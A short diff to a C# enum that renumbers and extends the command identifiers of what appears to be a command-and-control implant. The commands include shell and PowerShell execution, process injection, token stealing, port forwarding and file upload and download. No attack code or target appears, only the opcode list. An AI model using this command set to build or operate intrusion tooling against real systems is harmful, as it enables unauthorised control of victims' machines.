@@ -8,36 +8,45 @@ namespace Shared
 {
     public enum CommandId : byte
     {
-        CheckIn = 0x00,
-        Whoami = 0x01,
-        Exit = 0x02,
 
-        Cat = 0x03,
-        Cd = 0x04,
-        Pwd = 0x05,
-        Ls = 0x06,
+        None = 0x0,
+        CheckIn = 0x01,
+        Whoami = 0x02,
+        Exit = 0x03,
 
-        Powershell = 0x07,
-        PowershellImport = 0x08,
-        Shell = 0x09,
+        Cat = 0x04,
+        Cd = 0x05,
+        Pwd = 0x06,
+        Ls = 0x07,
 
-        Job = 0x10,
-        ForkAndRun = 0x11,
-        Assembly = 0x12,
-        Inject = 0x13,
-        Link = 0x14,
+        Powershell = 0x08,
+        PowershellImport = 0x09,
+        Shell = 0x010,
 
-        ListProcess = 0x15,
+        Job = 0x11,
+        ForkAndRun = 0x12,
+        Assembly = 0x13,
+        Inject = 0x14,
+        Link = 0x15,
 
-        Upload = 0x16,
-        Download = 0x17,
+        ListProcess = 0x16,
 
-        Proxy = 0x18,
-        Sleep = 0x19,
-        RportFwd = 0x20,
+        Upload = 0x17,
+        Download = 0x18,
 
-        MakeToken,
-        StealToken,
-        RevertSelf
+        Proxy = 0x19,
+        Sleep = 0x20,
+        RportFwd = 0x21,
+
+        MakeToken = 0x22,
+        StealToken = 0x23,
+        RevertSelf = 0x24,
+
+        Idle = 0x25,
+
+        Script = 0x26,
+        Delay = 0x27,
+        Echo = 0x28,
+
     }
-}
+}   
